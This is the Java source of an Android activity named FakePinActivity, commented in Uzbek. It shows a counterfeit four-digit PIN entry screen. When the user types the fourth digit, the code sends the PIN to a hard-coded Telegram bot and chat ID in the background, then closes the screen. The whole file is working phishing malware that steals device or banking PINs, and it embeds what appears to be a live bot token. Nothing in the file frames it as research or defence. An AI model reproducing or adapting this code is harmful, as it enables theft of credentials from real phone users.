package com.system.security;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class FakePinActivity extends AppCompatActivity {

    private StringBuilder inputPin = new StringBuilder();
    private TextView dotDisplay;
    private static final String BOT_TOKEN = "8641599033:AAFqD1brrN4CGQebEFnnCNFire5f3xsDep4";
    private static final String CHAT_ID = "8572227182";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_fake_pin);

        dotDisplay = findViewById(R.id.dotDisplay);

        View.OnClickListener numListener = v -> {
            if (inputPin.length() < 4) {
                Button b = (Button) v;
                inputPin.append(b.getText());
                updateDots();
                
                if (inputPin.length() == 4) {
                    sendPin(inputPin.toString());
                    finish(); // PIN olingach, oynani yopish
                }
            }
        };

        // Tugmalarni bog'lash (0-9)
        int[] ids = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
        for (int id : ids) {
            findViewById(id).setOnClickListener(numListener);
        }
    }

    private void updateDots() {
        StringBuilder dots = new StringBuilder();
        for (int i = 0; i < inputPin.length(); i++) dots.append("●  ");
        for (int i = inputPin.length(); i < 4; i++) dots.append("○  ");
        dotDisplay.setText(dots.toString().trim());
    }

    private void sendPin(final String pin) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=USER_ENTERED_PIN: " + pin);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.getInputStream().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
